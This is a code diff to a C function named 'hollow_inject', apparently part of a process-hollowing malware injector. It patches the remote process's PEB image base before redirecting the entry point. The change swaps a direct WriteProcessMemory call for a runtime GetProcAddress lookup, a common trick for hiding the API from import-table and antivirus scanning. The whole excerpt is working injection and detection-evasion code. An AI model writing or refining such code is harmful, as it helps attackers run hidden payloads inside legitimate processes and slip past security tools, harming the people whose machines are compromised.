@@ -286,10 +286,13 @@ int hollow_inject(const uint8_t *pe_buf, size_t pe_len)
     if (NtQIP) {
         PROCESS_BASIC_INFORMATION pbi = {0};
         NtQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
-        if (pbi.PebBaseAddress)
-            WriteProcessMemory(pi.hProcess,
-                (BYTE *)pbi.PebBaseAddress + 0x10,
-                &remote_view, sizeof(PVOID), NULL);
+        if (pbi.PebBaseAddress) {
+            typedef BOOL (WINAPI *_fWPM_t)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
+            HMODULE _hk = GetModuleHandleA("kernel32.dll");
+            _fWPM_t _fWPM = _hk ? (_fWPM_t)(void*)GetProcAddress(_hk,"WriteProcessMemory"):NULL;
+            if (_fWPM) _fWPM(pi.hProcess, (BYTE*)pbi.PebBaseAddress+0x10,
+                             &remote_view, sizeof(PVOID), NULL);
+        }
     }
 
     /* ---- Redirect entry point ---- */
